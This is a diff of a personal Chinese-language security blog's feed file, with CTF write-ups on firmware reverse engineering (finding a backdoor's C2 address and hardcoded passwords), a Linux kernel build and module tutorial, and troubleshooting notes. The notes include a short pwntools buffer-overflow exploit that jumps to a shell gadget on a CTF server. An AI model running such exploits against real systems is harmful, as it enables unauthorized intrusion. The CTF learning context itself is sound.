@@ -4,6 +4,58 @@
   
   
   <entry>
+    <title>固件逆向</title>
+    <link href="/2023/05/10/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/ctf-firmware/"/>
+    <url>/2023/05/10/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/ctf-firmware/</url>
+    
+    <content type="html"><![CDATA[<h4 id="题目1-buuctf-firmware"><a href="#题目1-buuctf-firmware" class="headerlink" title="题目1-buuctf-firmware"></a>题目1-buuctf-firmware</h4><p><a href="https://buuoj.cn/challenges#firmware">https://buuoj.cn/challenges#firmware</a></p><p><img src="/img/firmware/1.jpg"></p><p>使用binwalk提取固件</p><p><img src="/img/firmware/2.jpg"></p><p>可以找到squashfs文件系统，并且可以在/tmp路径下可以找到名为backdoor的程序</p><p><img src="/img/firmware/3.jpg"></p><p>用upx脱壳后寻找类似网址的字符串，找到以下三个</p><p><img src="/img/firmware/4.jpg"></p><p>首先看第一个，它出现在initConnection这个函数，并且建立了这个url的36667端口链接，大概率题目找的就是这个</p><p><img src="/img/firmware/5.jpg"></p><p>第二个、第三个只出现在send函数发送的字符串里，显然不对</p><p><img src="/img/firmware/6.jpg"></p><p><img src="/img/firmware/7.jpg"></p><p>因此flag = {MD5(echo.byethost51.com:36667)} = {33a422c45d551ac6e4756f59812a954b}</p><h4 id="题目2-CTFHUB-二次设备固件逆向"><a href="#题目2-CTFHUB-二次设备固件逆向" class="headerlink" title="题目2-CTFHUB-二次设备固件逆向"></a>题目2-CTFHUB-二次设备固件逆向</h4><p>直接打开提供的压缩包，只有一个home文件夹，由于题目中说要找硬编码字符串，直接在文件夹里搜索password之类的字符串</p><p><img src="/img/firmware/8.jpg"></p><p>打开JZPHMISystem，搜索password字符串</p><p><img src="/img/firmware/9.jpg"></p><p>按x找引用到这里，发现了一个叫做inputPassword的函数</p><p><img src="/img/firmware/10.jpg"></p><p>这个函数调用了InputPwd_pro，然后在这个函数里找类似strcmp的函数</p><p><img src="/img/firmware/11.jpg"></p><p>双击这个689078字符串，发现他的名字叫做rootPasswd，那么猜测可能这个就是题目要求的密码</p><p>然后打开另一个能搜到password的文件，发现这两个几乎是同样的结构流程</p><p>只不过在rootPasswd这里存在区别</p><p><img src="/img/firmware/12.jpg"></p><p>把这个icspwd提交上去就是对的。。。前面那个689078就不行</p><h4 id="题目3-CTFHUB-简单的固件逆向分析"><a href="#题目3-CTFHUB-简单的固件逆向分析" class="headerlink" title="题目3-CTFHUB-简单的固件逆向分析"></a>题目3-CTFHUB-简单的固件逆向分析</h4><p>用tree查看文件结构之后发现有用的二进制文件只有一个<code>wwwroot/conf/exec/NOE7701.bin</code></p><p>使用binwalk提取出来217和217.zlib两个文件</p><p>用binwalk -A查看217的架构，发现是PowerPC big-endian</p><p><img src="/img/firmware/13.jpg"></p><p>接下来识别固件的加载地址，通常vxworks内核加载地址为0x10000，但是关于如何验证，见 <a href="https://www.cnblogs.com/yangmzh3/p/11231423.html">https://www.cnblogs.com/yangmzh3/p/11231423.html</a></p><p><img src="/img/firmware/13_.jpg"></p><p>用ida打开，选择PowerPC big-endian[PPC]，使用0x10000作为固件加载地址</p><p><img src="/img/firmware/14.jpg"></p><p><img src="/img/firmware/15.jpg"></p><p>发现ida识别不出来函数</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>固件仿真</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>firmware analysis</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>linux kernel 学习</title>
+    <link href="/2023/05/01/linux%20kernel/linux%20kernel/"/>
+    <url>/2023/05/01/linux%20kernel/linux%20kernel/</url>
+    
+    <content type="html"><![CDATA[<h3 id="ubuntu源码编译安装"><a href="#ubuntu源码编译安装" class="headerlink" title="ubuntu源码编译安装"></a>ubuntu源码编译安装</h3><p>下载：<a href="https://www.kernel.org/">https://www.kernel.org</a></p><p>必要的编译环境，禁用证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install gcc g++ clang cmake make flex bison libssl-dev<br>sudo apt-get install openssl<br>sudo apt-get install libssl-dev libelf-dev <br>./scripts/config --disable SYSTEM_TRUSTED_KEYS<br>./scripts/config --disable SYSTEM_REVOCATION_KEYS<br></code></pre></td></tr></table></figure><p>编译的配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo make menuconfig # 最大化终端，否则图形界面显示不出来，使用默认配置直接save然后exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果不把Enbale loadable module support 勾上，生成的.config就不能modules_install</span><br>sudo make -j4 #代表编译线程个数<br></code></pre></td></tr></table></figure><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo make modules_install<br>sudo make install<br></code></pre></td></tr></table></figure><p>打开引导菜单</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gedit /etc/default/grub # 注释hidden项，修改停留时间GRUB_TIMEOUT=10<br>sudo update-grub<br>sudo reboot<br></code></pre></td></tr></table></figure><p><img src="/img/kernel/1.jpg"></p><p>多出了新安装的6.3.1的kernel</p><p>重启之后<code>uname -ra</code>会发现内核版本变了</p><h3 id="驱动程序编写"><a href="#驱动程序编写" class="headerlink" title="驱动程序编写"></a>驱动程序编写</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//hello.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;haidragon BSD/GPL&quot;</span>);<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hello_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>printk(KERN_EMERG <span class="hljs-string">&quot;Load Hello World\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> hello <span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_EMERG <span class="hljs-string">&quot;Remove Hello world\n&quot;</span>);<br>&#125;<br><br>module_init(hello_init);<br>module_exit(hello_exit);<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#Makefile</span><br>KDIR:= /lib/modules/6.3.1/build<br><span class="hljs-section">all:</span><br>make -C <span class="hljs-variable">$(KDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules<br><span class="hljs-section">clean:</span><br>rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order<br></code></pre></td></tr></table></figure><p>编译出来的<code>hello.ko</code>，用<code>insmod</code>安装，用<code>rmmod</code>卸载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo insmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br>sudo rmmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>linux kernel</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>驱动开发</tag>
+      
+      <tag>kernel漏洞</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>pwnable_simple_login</title>
     <link href="/2023/04/24/ctf-pwn/pwnable_simple_login/"/>
     <url>/2023/04/24/ctf-pwn/pwnable_simple_login/</url>
@@ -164,19 +216,6 @@
   
   
   <entry>
-    <title></title>
-    <link href="/2023/03/14/mips%E6%B1%87%E7%BC%96/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BE%8B%E9%A2%98/"/>
-    <url>/2023/03/14/mips%E6%B1%87%E7%BC%96/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BE%8B%E9%A2%98/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>mips的堆栈</title>
     <link href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/"/>
     <url>/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/</url>
@@ -312,7 +351,7 @@
     <link href="/2022/11/29/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
     <url>/2022/11/29/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
     
-    <content type="html"><![CDATA[<h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p><p><a href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p><p>本来是很简单的一个溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>但是不加sleep无法通过</p><p>有人说是python同时发送多个字符串时会合并(?)</p><p>那什么时候情况下需要在sendline前面加一个sleep</p><p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p><hr><h4 id="binwalk提取固件时快捷方式指向-dev-null"><a href="#binwalk提取固件时快捷方式指向-dev-null" class="headerlink" title="binwalk提取固件时快捷方式指向/dev/null"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure><p>用到这个快捷方式时要修改一下</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>vmware自带的vmtools安装了也复制不进来</strong></p><p>虚拟机执行命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure><p>如果拖放文件的时候出现了</p><p><img src="/img/problems/1.jpg"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/g</span>dm3/custom.conf<br></code></pre></td></tr></table></figure><p>将<code>WaylandEnable=false</code>注释掉</p><p>据说是vmware还没有支持ubutnu22.04的默认桌面Wayland</p><h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p><p><a href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p><p>本来是很简单的一个溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>但是不加sleep无法通过</p><p>有人说是python同时发送多个字符串时会合并(?)</p><p>那什么时候情况下需要在sendline前面加一个sleep</p><p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p><hr><h4 id="binwalk提取固件时快捷方式指向-dev-null"><a href="#binwalk提取固件时快捷方式指向-dev-null" class="headerlink" title="binwalk提取固件时快捷方式指向/dev/null"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure><p>用到这个快捷方式时要修改一下</p>]]></content>
     
     
     <categories>
